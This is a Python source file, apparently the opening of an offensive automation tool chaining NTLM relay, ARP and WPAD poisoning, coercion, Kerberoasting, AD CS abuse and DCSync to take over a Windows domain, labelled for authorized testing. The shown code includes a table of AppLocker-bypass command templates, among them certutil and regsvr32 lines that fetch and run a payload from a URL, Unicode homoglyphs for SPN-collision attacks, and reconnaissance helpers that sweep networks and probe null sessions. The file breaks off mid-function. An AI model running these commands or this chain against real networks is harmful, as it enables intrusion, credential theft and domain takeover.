#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  NTLM Relay Attack Chain Automation                              ║
║  Triop AB — For authorized penetration testing only              ║
║                                                                  ║
║  Automated zero-auth to domain compromise:                       ║
║  1. Auto-discovery (DC, network, interfaces, WSUS)               ║
║  2. ARP spoof NTLM capture (zero-auth, no creds needed)         ║
║  3. WPAD poisoning via mitm6/Responder (IPv6 DNS hijack)        ║
║  4. WSUS relay — intercept Windows Update NTLM auth             ║
║  5. NTLM relay via impacket (leverages CVE-2025-33073)          ║
║  6. Multi-method coercion (PetitPotam, DFSCoerce, PrinterBug,   ║
║     ShadowCoerce, MSEven)                                        ║
║  7. Hash cracking (hashcat/john)                                 ║
║  8. PXE boot image credential theft via TFTP (zero-auth)        ║
║  9. NTLM theft file drops (.library-ms/.theme on shares)        ║
║  10. Kerberoasting + AS-REP Roasting (credential harvest)       ║
║  11. AD CS — ESC1-17 enum (Certihound) / ESC1-16 exploit        ║
║  12. SCCM NAA credential theft (sccmhunter)                     ║
║  13. Shadow Credentials (msDS-KeyCredentialLink via PKINIT)     ║
║  14. RBCD abuse (S4U2Proxy impersonation)                       ║
║  15. WebDAV coercion (WebClient HTTP→LDAP relay bypass)         ║
║  16. DHCP coercion (DHCP server machine account relay)          ║
║  17. GPO abuse (pyGPOAbuse scheduled task as SYSTEM)            ║
║  18. WSUS injection + AppLocker bypass (LOLBins/signed updates) ║
║  19. DCSync + DPAPI backup key extraction                        ║
║  20. BloodHound -c All collection + auto high-value analysis    ║
║  21. Auth-reflection bypass (Synacktiv 2026):                    ║
║      - Unicode-SPN Kerberos reflection (CVE-2025-58726 ghost SPN)║
║      - CVE-2026-24294 LPE (SMB-on-arbitrary-tcpport)             ║
║      - CVE-2026-26128 LPE (Kerberos loopback via Unicode SPN)    ║
╚══════════════════════════════════════════════════════════════════╝
"""

from __future__ import annotations

import argparse
import ipaddress
import json
import logging
import os
import re
import shutil
import signal
import subprocess
import sys
import textwrap
import threading
import time
import zipfile
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Optional

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Configuration
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

VERSION = "4.10.1"
TOOLS_DIR = Path("/opt/tools")
CVE_DIR = TOOLS_DIR / "CVE-2025-33073"
KRBRELAYX_DIR = TOOLS_DIR / "krbrelayx"

COERCION_METHODS = ["DFSCoerce", "PetitPotam", "PrinterBug", "ShadowCoerce", "MSEven"]

# Unicode homoglyphs for SPN-collision attacks (Synacktiv 2026 Kerberos
# reflection technique, CVE-2025-58726). LCMapStringEx with linguistic
# normalization collapses these to ASCII during AD/Kerberos canonicalization,
# while DnsCache's CompareStringW comparison preserves them — so the DNS
# record points to attacker, but the issued TGS/AP-REQ is for the real host.
# `R` -> circled-R and `.` -> one-dot-leader are the pair shown in the blog.
UNICODE_HOMOGLYPHS = {
    "R": "Ⓡ", ".": "․",
    "A": "А", "B": "В", "C": "С", "E": "Е", "H": "Н", "I": "І",
    "K": "К", "M": "М", "O": "О", "P": "Р", "T": "Т", "X": "Х",
    "a": "а", "c": "с", "e": "е", "i": "і", "o": "о", "p": "р",
    "x": "х", "y": "у",
}

# Loopback-signing enforcement (March 2026 patch for CVE-2026-26128) is
# present on Server 2025 / Win11 24H2 builds. Hosts at or below these
# build numbers may still be vulnerable to the reflection LPE phases.
# Build floors are conservative — operator confirms via target patch level.
LOOPBACK_VULNERABLE_OS_HINTS = (
    "Windows Server 2025",
    "Windows 11",       # 24H2 = build 26100.x (pre-patch)
    "Build 26100",
    "Build 26200",
)

# LOLBins that bypass AppLocker default rules (Microsoft-signed, in trusted paths)
LOLBINS = {
    "mshta": 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""{cmd}"", 0:close")',
    "certutil": 'cmd /c certutil -urlcache -split -f {url} C:\\Windows\\Tasks\\svc.exe & C:\\Windows\\Tasks\\svc.exe',
    "msbuild": 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Windows\\Tasks\\payload.csproj',
    "regsvr32": 'regsvr32 /s /n /u /i:{url} scrobj.dll',
    "rundll32": 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("{cmd}")',
    "wmic": 'wmic os get /format:"{url}"',
    "cmstp": 'cmstp.exe /ni /s C:\\Windows\\Tasks\\payload.inf',
}

# AppLocker-safe writable directories under default Windows trusted paths
APPLOCKER_SAFE_PATHS = [
    "C:\\Windows\\Tasks",
    "C:\\Windows\\Temp",
    "C:\\Windows\\tracing",
    "C:\\Windows\\System32\\spool\\drivers\\color",
    "C:\\Windows\\SoftwareDistribution",
]

# WSUS default ports
WSUS_HTTP_PORT = 8530
WSUS_HTTPS_PORT = 8531

WORDLISTS = [
    Path("/usr/share/wordlists/rockyou.txt"),
    Path("/usr/share/wordlists/rockyou.txt.gz"),
    Path("/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"),
    Path("/usr/share/wordlists/fasttrack.txt"),
]


@dataclass
class Config:
    """Attack chain configuration — auto-populated by discovery."""

    # Credentials (optional for zero-auth ARP mode)
    username: str = ""
    password: str = ""
    nthash: str = ""
    domain: str = ""

    # Network
    attacker_ip: str = ""
    iface: str = ""
    gateway: str = ""
    target_net: str = ""
    specific_target: str = ""
    dc_ip: str = ""
    dc_fqdn: str = ""

    # Attack options
    method: str = ""
    custom_cmd: str = ""
    use_socks: bool = False
    smb_signing: bool = False
    no_dcsync: bool = False
    no_cleanup: bool = False
    no_arp: bool = False
    batch: bool = False
    poison_duration: int = 120

    # WPAD/WSUS options
    wsus_server: str = ""
    wsus_port: int = 0
    wsus_https: bool = False
    wsus_certfile: str = ""
    wsus_keyfile: str = ""
    no_wpad: bool = False
    no_wsus: bool = False
    sniff_duration: int = 30

    # AppLocker bypass options
    applocker: bool = False
    lolbin: str = ""
    payload_url: str = ""

    # AD CS options
    no_adcs: bool = False
    ca_name: str = ""
    esc_victim_user: str = ""      # ESC9/ESC10 victim — UPN-swap target
    esc_victim_password: str = ""

    # Roasting options
    no_roast: bool = False

    # NTLM theft file drop options
    no_ntlm_theft: bool = False

    # SCCM options
    no_sccm: bool = False
    sccm_server: str = ""

    # Shadow Credentials / RBCD options
    no_shadow_creds: bool = False
    no_rbcd: bool = False
    machine_account: str = ""
    machine_password: str = ""
    alt_spn: str = ""              # KCD protocol-transition bypass (tgssub-style)
    in_ccache: str = ""            # input ccache for --phase tgs-rewrite
    target_user: str = ""          # for --phase dollar-ticket (e.g., 'root')

    # DPAPI options
    no_dpapi: bool = False

    # BloodHound options (v4.9.0 — post-auth graph collection + analysis)
    no_bloodhound: bool = False
    no_bh_auto_action: bool = False  # disable opportunistic chains from BH actionable edges

    # Loot options (v4.9.0 — cmdline + KeePass harvest on compromised hosts)
    no_loot: bool = False

    # Credential discovery options (v4.7.0 — pre-cut zero-auth foothold)
    no_discover: bool = False
    users_file: str = ""           # path to user list; auto-falls back to SecLists
    spray_password: str = ""       # single password to spray; empty = skip spray
    discovered_users: list = field(default_factory=list, repr=False)

    # Authentication-reflection bypass options (v4.8.0 — Synacktiv 2026 chain)
    unicode_spn: bool = False      # Kerberos AP-REQ reflection via Unicode SPN collision
    no_ghost_spn: bool = False     # skip CVE-2025-58726 ghost-SPN upgrade after LDAP relay
    no_loopback_check: bool = False  # skip loopback-signing fingerprint during enum
    reflect_host: str = ""         # foothold host for reflect-tcpport/reflect-loopback (cosmetic — script is generic)
    reflect_port: int = 12345      # arbitrary high port for SMB-on-tcpport (CVE-2026-24294)

    # Runtime
    phase: str = "full"
    dry_run: bool = False
    verbose: bool = False
    work_dir: Path = field(default_factory=lambda: Path("."))

    # State
    bg_processes: list = field(default_factory=list, repr=False)
    start_time: float = field(default_factory=time.time, repr=False)

    @property
    def has_creds(self) -> bool:
        return bool(self.username and (self.password or self.nthash))

    @property
    def auth_string(self) -> str:
        """Impacket-style DOMAIN/user:pass string."""
        if self.nthash:
            return f"{self.domain}/{self.username}"
        return f"{self.domain}/{self.username}:{self.password}"

    @property
    def auth_args(self) -> list[str]:
        """Auth arguments for impacket tools."""
        if self.nthash:
            return [f"{self.domain}/{self.username}", "-hashes", f":{self.nthash}"]
        return [f"{self.domain}/{self.username}:{self.password}"]

    def cleanup(self):
        """Kill all background processes and close file handles."""
        for proc in self.bg_processes:
            try:
                if hasattr(proc, 'poll') and proc.poll() is None:
                    os.killpg(proc.pid, signal.SIGTERM)
                    proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
            # Close tracked file handles
            try:
                fh = getattr(proc, '_outfile', None)
                if fh and fh != subprocess.DEVNULL:
                    fh.close()
            except Exception:
                pass
        self.bg_processes.clear()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Logging — colors, emojis, timestamps, file output
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class Colors:
    RED = "\033[0;31m"
    BOLD_RED = "\033[1;31m"
    GREEN = "\033[0;32m"
    BOLD_GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    BOLD_YELLOW = "\033[1;33m"
    BLUE = "\033[0;34m"
    BOLD_BLUE = "\033[1;34m"
    MAGENTA = "\033[0;35m"
    BOLD_MAGENTA = "\033[1;35m"
    CYAN = "\033[0;36m"
    BOLD_CYAN = "\033[1;36m"
    WHITE = "\033[1;37m"
    DIM = "\033[2m"
    BOLD = "\033[1m"
    NC = "\033[0m"


C = Colors


class EmojiFormatter(logging.Formatter):
    """Console formatter with colors, emojis, and timestamps."""

    FORMATS = {
        logging.DEBUG: f"{C.DIM}[%(asctime)s] 🔍 %(message)s{C.NC}",
        logging.INFO: f"{C.BLUE}[%(asctime)s]{C.NC} 🔵 %(message)s",
        logging.WARNING: f"{C.YELLOW}[%(asctime)s]{C.NC} ⚠️  %(message)s",
        logging.ERROR: f"{C.RED}[%(asctime)s]{C.NC} ❌ %(message)s",
        logging.CRITICAL: f"{C.BOLD_RED}[%(asctime)s]{C.NC} 💀 %(message)s",
        25: f"{C.GREEN}[%(asctime)s]{C.NC} ✅ %(message)s",  # SUCCESS
        26: f"{C.CYAN}   ℹ️  %(message)s{C.NC}",  # INFO_DETAIL
        27: f"{C.BOLD_MAGENTA}%(message)s{C.NC}",  # PHASE
    }

    def format(self, record):
        fmt = self.FORMATS.get(record.levelno, self.FORMATS[logging.INFO])
        formatter = logging.Formatter(fmt, datefmt="%H:%M:%S")
        return formatter.format(record)


class FileFormatter(logging.Formatter):
    """Plain-text formatter for log files (no ANSI codes)."""

    def format(self, record):
        ts = datetime.fromtimestamp(record.created).strftime("%Y-%m-%d %H:%M:%S")
        level = {25: "OK", 26: "INFO", 27: "PHASE"}.get(record.levelno, record.levelname)
        return f"[{ts}] [{level}] {record.getMessage()}"


# Custom log levels
logging.addLevelName(25, "SUCCESS")
logging.addLevelName(26, "DETAIL")
logging.addLevelName(27, "PHASE")

log = logging.getLogger("ntlm-chain")
log.setLevel(logging.DEBUG)

# Console handler
_console = logging.StreamHandler(sys.stdout)
_console.setFormatter(EmojiFormatter())
_console.setLevel(logging.INFO)
log.addHandler(_console)

# File handler (added later when work_dir is known)
_file_handler: Optional[logging.FileHandler] = None


def setup_file_logging(work_dir: Path):
    global _file_handler
    log_path = work_dir / "chain.log"
    _file_handler = logging.FileHandler(log_path, encoding="utf-8")
    _file_handler.setFormatter(FileFormatter())
    _file_handler.setLevel(logging.DEBUG)
    log.addHandler(_file_handler)
    log.debug(f"Logging to {log_path}")


def ok(msg: str):
    log.log(25, msg)

def detail(msg: str):
    log.log(26, msg)

def phase_header(title: str):
    bar = "━" * 56
    log.log(27, f"\n{bar}")
    log.log(27, f"  🎯 {title}")
    log.log(27, bar + "\n")


def success_box(msg: str):
    print(f"\n{C.BOLD_GREEN}╔══════════════════════════════════════════════════════╗")
    print(f"║  🏆 {msg:<50} ║")
    print(f"╚══════════════════════════════════════════════════════╝{C.NC}\n")
    log.log(25, f"SUCCESS: {msg}")


def fail_box(msg: str):
    print(f"\n{C.BOLD_RED}╔══════════════════════════════════════════════════════╗")
    print(f"║  💀 {msg:<50} ║")
    print(f"╚══════════════════════════════════════════════════════╝{C.NC}\n")
    log.error(f"FAILED: {msg}")


def separator():
    print(f"{C.DIM}{'─' * 56}{C.NC}")


def banner():
    print(f"""{C.BOLD_RED}
       _   ___      _       _       ___
      /_\\ |   \\    /_\\ _  _| |_ ___| _ \\__ __ ___ _
     / _ \\| |) |  / _ \\ || |  _/ _ \\  _/\\ V  V / ' \\
    /_/ \\_\\___/  /_/ \\_\\_,_|\\__\\___/_|   \\_/\\_/|_||_|
{C.NC}""")
    print(f"{C.BOLD_CYAN}    ⚡ Zero-Auth to Domain Admin — Attack Chain{C.NC}")
    print(f"{C.DIM}    ARP | WPAD | WSUS | PXE | AD CS | SCCM | Roast | RBCD | GPO | DCSync{C.NC}")
    print(f"{C.DIM}    🔧 v{VERSION} | Triop AB | Authorized testing only{C.NC}")
    print(f"{C.DIM}    📋 Full log: <work_dir>/chain.log{C.NC}\n")
    separator()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Shell helpers
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def run(cmd: list[str], cfg: Config, timeout: int = 300,
        capture: bool = True, bg: bool = False,
        outfile: Optional[Path] = None) -> subprocess.CompletedProcess | subprocess.Popen:
    """Run a command, log it, optionally save output to file."""
    cmd_str = " ".join(str(c) for c in cmd)
    log.debug(f"$ {cmd_str}")

    if cfg.dry_run:
        # Print + return-without-launching applies to BOTH foreground and
        # background calls. Without this, --dry-run would still spawn ARP
        # spoofers, mitm6, Responder, ntlmrelayx, etc. — a serious safety
        # bug on customer networks.
        tag = "DRY RUN bg" if bg else "DRY RUN"
        print(f"{C.YELLOW}  [{tag}] {cmd_str}{C.NC}")
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    if bg:
        f_out = None
        try:
            f_out = open(outfile, "w") if outfile else subprocess.DEVNULL
            proc = subprocess.Popen(
                cmd, stdout=f_out, stderr=subprocess.STDOUT,
                text=True, preexec_fn=os.setpgrp
            )
            proc._outfile = f_out  # track for cleanup
            cfg.bg_processes.append(proc)
            return proc
        except FileNotFoundError:
            log.error(f"Command not found: {cmd[0]}")
            if f_out and f_out != subprocess.DEVNULL:
                f_out.close()
            return subprocess.CompletedProcess(cmd, 127, stdout="", stderr="not found")
        except Exception as e:
            log.error(f"Failed to start background process: {e}")
            if f_out and f_out != subprocess.DEVNULL:
                f_out.close()
            return subprocess.CompletedProcess(cmd, 1, stdout="", stderr=str(e))

    try:
        result = subprocess.run(
            cmd, capture_output=capture, text=True, timeout=timeout
        )
        if outfile:
            outfile.write_text(result.stdout + (result.stderr or ""))
        # Stream output if not capturing
        if not capture and result.stdout:
            print(result.stdout, end="")
        return result
    except subprocess.TimeoutExpired as e:
        log.warning(f"Command timed out after {timeout}s: {cmd_str}")
        # Persist any output captured before the timeout — required for
        # phases like passive_sniff() that intentionally run to timeout.
        # subprocess.TimeoutExpired carries .stdout/.stderr (bytes or str
        # depending on text= flag); coerce to str for write_text.
        if outfile:
            def _to_str(x):
                if x is None: return ""
                return x.decode(errors="replace") if isinstance(x, bytes) else x
            outfile.write_text(_to_str(e.stdout) + _to_str(e.stderr))
        return subprocess.CompletedProcess(cmd, 1, stdout="", stderr="timeout")
    except FileNotFoundError:
        log.error(f"Command not found: {cmd[0]}")
        return subprocess.CompletedProcess(cmd, 127, stdout="", stderr="not found")


def _nxc_auth_args(cfg) -> list[str]:
    """Build nxc authentication arguments, supporting both password and nthash."""
    if cfg.nthash:
        return ["-u", cfg.username, "-H", cfg.nthash, "-d", cfg.domain]
    return ["-u", cfg.username, "-p", cfg.password, "-d", cfg.domain]


def _bloody_auth_args(cfg) -> list[str]:
    """Build bloodyAD authentication arguments."""
    args = ["-d", cfg.domain, "-u", cfg.username, "--host", cfg.dc_ip]
    if cfg.nthash:
        args += ["-p", f":{cfg.nthash}"]
    else:
        args += ["-p", cfg.password]
    return args


def _first_line(text: str) -> str:
    """Safely get first non-empty line from text, or empty string."""
    lines = text.strip().splitlines()
    return lines[0] if lines else ""


def tool_exists(name: str) -> bool:
    return shutil.which(name) is not None


def find_tool(*names: str, paths: list[Path] | None = None) -> Optional[str]:
    """Find a tool by checking multiple names and paths."""
    for name in names:
        if shutil.which(name):
            return name
    if paths:
        for p in paths:
            if p.exists():
                return f"python3 {p}"
    return None


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Auto-Discovery
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class AutoDiscovery:
    """Detect network config: interface, IPs, domain, DC, gateway, subnet."""

    def __init__(self, cfg: Config):
        self.cfg = cfg
        self.detected = 0
        # Track attrs set by this discovery run so _skip() doesn't relabel
        # them as "user-specified" when re-checked by a later detect step
        self._auto_set: set[str] = set()

    def run_all(self):
        phase_header("AUTO-DISCOVERY")
        self._detect_interface()
        self._detect_attacker_ip()
        self._detect_gateway()
        self._detect_subnet()
        if self.cfg.has_creds or self.cfg.phase != "arp":
            # Subnet sweep first when domain+dc_ip both unknown — breaks the
            # chicken-and-egg where _detect_domain needs dc_ip and
            # _detect_dc_ip needs domain. Common on AWS / VPC labs where
            # resolv.conf doesn't point at AD DNS.
            self._detect_dc_via_scan()
            self._detect_domain()
            self._detect_dc_ip()
            self._detect_dc_fqdn()
        ok(f"Auto-discovery complete ({self.detected} values detected)")

    def _set(self, attr: str, value: str, method: str):
        """Set config attribute and log it."""
        if value:
            setattr(self.cfg, attr, value)
            self._auto_set.add(attr)
            ok(f"{attr.replace('_', ' ').title()}: {value} (auto: {method})")
            self.detected += 1

    def _skip(self, attr: str):
        val = getattr(self.cfg, attr)
        if val:
            # If we set this in an earlier discovery step, don't re-log
            # (would mislabel as "user-specified")
            if attr not in self._auto_set:
                detail(f"{attr.replace('_', ' ').title()}: {val} (user-specified)")
            return True
        return False

    def _detect_interface(self):
        # If user supplied an iface, validate it exists — fall back to auto if not
        if self.cfg.iface:
            if Path(f"/sys/class/net/{self.cfg.iface}").exists():
                detail(f"Iface: {self.cfg.iface} (user-specified)")
                return
            log.warning(f"Iface '{self.cfg.iface}' does not exist — auto-detecting")
            self.cfg.iface = ""
        try:
            out = subprocess.check_output(
                ["ip", "route", "show", "default"], text=True, timeout=5,
                stderr=subprocess.DEVNULL
            )
            for line in out.splitlines():
                if "default" in line:
                    parts = line.split()
                    idx = parts.index("dev") + 1 if "dev" in parts else -1
                    if idx > 0 and idx < len(parts):
                        self._set("iface", parts[idx], "default route")
                        return
        except Exception:
            pass
        log.warning("Could not detect network interface")

    def _detect_attacker_ip(self):
        if self._skip("attacker_ip"):
            return
        try:
            out = subprocess.check_output(
                ["ip", "-4", "route", "get", "1.1.1.1"], text=True, timeout=5,
                stderr=subprocess.DEVNULL
            )
            m = re.search(r"src (\d+\.\d+\.\d+\.\d+)", out)
            if m:
                self._set("attacker_ip", m.group(1), f"interface {self.cfg.iface}")
                return
        except Exception:
            pass
        # Fallback: from interface
        if self.cfg.iface:
            try:
                out = subprocess.check_output(
                    ["ip", "-4", "addr", "show", self.cfg.iface], text=True, timeout=5,
                    stderr=subprocess.DEVNULL
                )
                m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", out)
                if m:
                    self._set("attacker_ip", m.group(1), self.cfg.iface)
                    return
            except Exception:
                pass
        log.error("Could not detect attacker IP — specify with -a")

    def _detect_gateway(self):
        if self._skip("gateway"):
            return
        try:
            out = subprocess.check_output(
                ["ip", "route", "show", "default"], text=True, timeout=5,
                stderr=subprocess.DEVNULL
            )
            m = re.search(r"default via (\d+\.\d+\.\d+\.\d+)", out)
            if m:
                self._set("gateway", m.group(1), "default route")
                return
        except Exception:
            pass
        if self.cfg.dc_ip:
            self.cfg.gateway = self.cfg.dc_ip
            log.warning(f"Gateway: {self.cfg.dc_ip} (using DC IP as fallback)")

    def _detect_subnet(self):
        if self.cfg.target_net or self.cfg.specific_target:
            if self.cfg.target_net:
                detail(f"Target net: {self.cfg.target_net} (user-specified)")
            return
        if self.cfg.iface:
            try:
                out = subprocess.check_output(
                    ["ip", "-4", "addr", "show", self.cfg.iface], text=True, timeout=5,
                    stderr=subprocess.DEVNULL
                )
                m = re.search(r"inet (\d+\.\d+\.\d+\.\d+/\d+)", out)
                if m:
                    net = str(ipaddress.ip_network(m.group(1), strict=False))
                    self._set("target_net", net, self.cfg.iface)
                    return
            except Exception:
                pass
        log.error("Could not detect target subnet — specify with -t")

    def _detect_dc_via_scan(self):
        """Sweep nearby subnets with `nxc smb` to find any domain-joined host.
        Most common (domain:DOM) advertised in the SMB banners wins; the
        first host in that domain that also has SMB signing on becomes the
        dc_ip candidate (DCs require signing by default).

        Tries multiple candidate ranges in order: target_net (interface
        subnet, often /26 on AWS), then the /24 derived from attacker_ip
        (covers separate AD subnet on the same VPC). Sets cfg.domain
        + cfg.dc_ip + cfg.dc_fqdn in one shot, breaking the chicken-
        and-egg dependency between _detect_domain and _detect_dc_ip."""
        if self.cfg.dc_ip and self.cfg.domain:
            return
        if not tool_exists("nxc"):
            return

        ranges: list[str] = []
        if self.cfg.target_net:
            ranges.append(self.cfg.target_net)
        # Widen to /24 around attacker_ip if not already covered (AWS labs
        # often put jumpbox and AD hosts on different subnets within a /24)
        if self.cfg.attacker_ip:
            try:
                wider = str(ipaddress.ip_network(
                    f"{self.cfg.attacker_ip}/24", strict=False))
                if wider not in ranges:
                    ranges.append(wider)
            except Exception:
                pass

        for net_str in ranges:
            try:
                net = ipaddress.ip_network(net_str, strict=False)
                if net.num_addresses > 1024:
                    detail(f"Skipping {net_str} (too large: {net.num_addresses} hosts)")
                    continue
            except Exception:
                continue

            log.info(f"🔍 nxc smb sweep on {net_str} for domain-joined hosts...")
            try:
                out = subprocess.check_output(
                    ["nxc", "smb", net_str],
                    text=True, timeout=180, stderr=subprocess.DEVNULL
                )
            except Exception as e:
                log.debug(f"nxc sweep on {net_str} failed: {e}")
                continue

            domain_counts: dict[str, int] = {}
            candidates: list[tuple[str, str, bool, str]] = []
            for line in out.splitlines():
                m = re.search(
                    r"SMB\s+(\d+\.\d+\.\d+\.\d+)\s+\d+\s+(\S+)\s+\[\*\].*?domain:([^\s)]+).*?signing:(\w+)",
                    line,
                )
                if not m:
                    continue
                ip, name, dom, signing = m.group(1), m.group(2), m.group(3), m.group(4) == "True"
                if dom and "." in dom:
                    domain_counts[dom] = domain_counts.get(dom, 0) + 1
                    candidates.append((ip, name, signing, dom))

            if not domain_counts:
                detail(f"No domain-joined hosts on {net_str}")
                continue

            best_dom = max(domain_counts.items(), key=lambda kv: kv[1])[0]
            if not self.cfg.domain:
                self._set("domain", best_dom, f"nxc sweep {net_str}")
            if not self.cfg.dc_ip:
                # Prefer hosts with signing=True (DCs require signing by default)
                for ip, name, signing, dom in candidates:
                    if dom == best_dom and signing:
                        self._set("dc_ip", ip, f"nxc sweep {net_str} (signing=True)")
                        if not self.cfg.dc_fqdn:
                            self._set("dc_fqdn", f"{name.lower()}.{best_dom}",
                                      f"nxc sweep {net_str}")
                        return
                # Fallback: first host in domain (member server)
                for ip, name, signing, dom in candidates:
                    if dom == best_dom:
                        self._set("dc_ip", ip, f"nxc sweep {net_str}")
                        if not self.cfg.dc_fqdn:
                            self._set("dc_fqdn", f"{name.lower()}.{best_dom}",
                                      f"nxc sweep {net_str}")
                        return
            return  # found domain — don't widen further

    def _detect_domain(self):
        if self._skip("domain"):
            return

        # Method 1: resolv.conf (search/domain directives)
        resolv = Path("/etc/resolv.conf")
        if resolv.exists():
            for line in resolv.read_text().splitlines():
                if line.startswith("search "):
                    dom = line.split()[1] if len(line.split()) > 1 else ""
                    # Skip generic/cloud domains
                    if dom and "." in dom and not dom.endswith((".internal", ".local.cloud", ".amazonaws.com", ".compute.internal")):
                        self._set("domain", dom, "resolv.conf")
                        return
                if line.startswith("domain "):
                    dom = line.split()[1] if len(line.split()) > 1 else ""
                    if dom and not dom.endswith((".internal", ".amazonaws.com", ".compute.internal")):
                        self._set("domain", dom, "resolv.conf")
                        return

        # Method 2: Reverse DNS on the gateway or DC IP
        target_ip = self.cfg.dc_ip or self.cfg.gateway
        if target_ip and tool_exists("nmap"):
            try:
                out = subprocess.check_output(
                    ["nmap", "-sn", "-Pn", "--system-dns", target_ip],
                    timeout=10, text=True, stderr=subprocess.DEVNULL
                )
                # Look for FQDN like "dc01.corp.local" (not IP addresses)
                fqdn_match = re.search(r"for\s+([a-zA-Z][a-zA-Z0-9-]+\.[a-zA-Z0-9.-]+)", out)
                if fqdn_match:
                    fqdn = fqdn_match.group(1)
                    # Extract domain from FQDN (remove hostname)
                    parts = fqdn.split(".")
                    if len(parts) >= 3:
                        dom = ".".join(parts[1:])
                    elif len(parts) == 2:
                        dom = fqdn
                    else:
                        dom = ""
                    if dom and not re.match(r"^\d+\.\d+", dom):  # Not an IP
                        self._set("domain", dom, "reverse DNS")
                        return
            except Exception:
                pass

        # Method 3: LDAP rootDSE query against DC (zero-auth)
        if self.cfg.dc_ip:
            try:
                out = subprocess.check_output(
                    ["ldapsearch", "-x", "-H", f"ldap://{self.cfg.dc_ip}",
                     "-s", "base", "-b", "", "defaultNamingContext"],
                    timeout=10, text=True, stderr=subprocess.DEVNULL
                )
                # Parse "defaultNamingContext: DC=corp,DC=local"
                dn_match = re.search(r"defaultNamingContext:\s*(DC=.+)", out, re.IGNORECASE)
                if dn_match:
                    dom = dn_match.group(1).replace("DC=", "").replace(",", ".")
                    self._set("domain", dom, "LDAP rootDSE")
                    return
            except Exception:
                pass

        # Method 4: SMB null session (nxc)
        if self.cfg.dc_ip and tool_exists("nxc"):
            try:
                out = subprocess.check_output(
                    ["nxc", "smb", self.cfg.dc_ip, "-u", "", "-p", ""],
                    timeout=15, text=True, stderr=subprocess.DEVNULL
                )
                # Parse "domain:CORP.LOCAL" from nxc output
                dom_match = re.search(r"domain:(\S+)", out, re.IGNORECASE)
                if dom_match:
                    dom = dom_match.group(1)
                    if "." in dom:
                        self._set("domain", dom, "SMB null session")
                        return
            except Exception:
                pass

        log.error("Could not detect domain — specify with -d")

    def _detect_dc_ip(self):
        if self._skip("dc_ip"):
            return
        domain = self.cfg.domain
        if not domain:
            return

        # Build a list of dig invocations to try, in order. When
        # cfg.gateway is on the same subnet as a likely DC, also probe
        # there in case the DC was discovered in some other way.
        dig_targets: list[list[str]] = [[]]  # [] = system resolver
        # If the user specified a DC IP somewhere upstream, prefer it
        # explicitly — works around AWS / VPC labs where resolv.conf
        # doesn't point at the AD DNS server.
        if self.cfg.dc_ip:
            dig_targets.insert(0, [f"@{self.cfg.dc_ip}"])

        # SRV lookup with each candidate resolver
        if tool_exists("dig"):
            for at in dig_targets:
                try:
                    out = subprocess.check_output(
                        ["dig", "+short", "+timeout=3"] + at +
                        ["SRV", f"_ldap._tcp.dc._msdcs.{domain}"],
                        text=True, timeout=10, stderr=subprocess.DEVNULL
                    )
                    lines = sorted(out.strip().splitlines())
                    if not lines:
                        continue
                    host = lines[0].split()[-1].rstrip(".")
                    out2 = subprocess.check_output(
                        ["dig", "+short", "+timeout=3"] + at + ["A", host],
                        text=True, timeout=5, stderr=subprocess.DEVNULL
                    )
                    ip = out2.strip().splitlines()[0] if out2.strip() else ""
                    if ip:
                        method = "DNS SRV _ldap._tcp"
                        if at:
                            method += f" {at[0]}"
                        self._set("dc_ip", ip, method)
                        return
                except Exception:
                    continue

        # Fallback: resolve domain directly
        if tool_exists("dig"):
            for at in dig_targets:
                try:
                    out = subprocess.check_output(
                        ["dig", "+short", "+timeout=3"] + at + ["A", domain],
                        text=True, timeout=5, stderr=subprocess.DEVNULL
                    )
                    ip = out.strip().splitlines()[0] if out.strip() else ""
                    if ip:
                        self._set("dc_ip", ip, f"DNS A {domain}")
                        return
                except Exception:
                    continue
        log.error("Could not detect DC IP — specify with --dc-ip")

    def _detect_dc_fqdn(self):
        if self._skip("dc_fqdn"):
            return
        dc_ip = self.cfg.dc_ip
        domain = self.cfg.domain
        if not dc_ip:
            return
        # Reverse DNS
        if tool_exists("dig"):
            try:
                out = subprocess.check_output(
                    ["dig", "+short", "-x", dc_ip], text=True, timeout=5,
                    stderr=subprocess.DEVNULL
                )
                fqdn = out.strip().splitlines()[0].rstrip(".") if out.strip() else ""
                if fqdn:
                    self._set("dc_fqdn", fqdn, "reverse DNS")
                    return
            except Exception:
                pass
        # nxc fingerprint
        if tool_exists("nxc"):
            try:
                out = subprocess.check_output(
                    ["nxc", "smb", dc_ip], text=True, timeout=15, stderr=subprocess.DEVNULL
                )
                # nxc prints "(name:HOST) (domain:DOM)" — \S+ would eat the ')'
                m = re.search(r"name:([^\s)]+)", out, re.IGNORECASE)
                if m:
                    self._set("dc_fqdn", f"{m.group(1)}.{domain}", "nxc SMB")
                    return
            except Exception:
                pass
        # Guess
